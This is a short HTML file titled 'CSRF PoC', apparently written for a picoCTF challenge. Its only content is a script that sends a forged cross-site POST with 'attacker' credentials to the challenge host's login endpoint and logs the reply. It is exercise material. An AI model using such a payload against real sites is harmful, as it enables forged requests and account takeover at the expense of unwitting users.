<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>CSRF PoC</title>
  </head>
  <body>
    <script>
      // Use fetch() to send the CSRF POST request
      fetch('http://saturn.picoctf.net:49531/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          'username': 'attacker',
          'password': 'attacker'
        })
      })
      .then(response => response.text())
      .then(result => console.log(result))
      .catch(error => console.error('Error:', error));
    </script>
  </body>
</html>
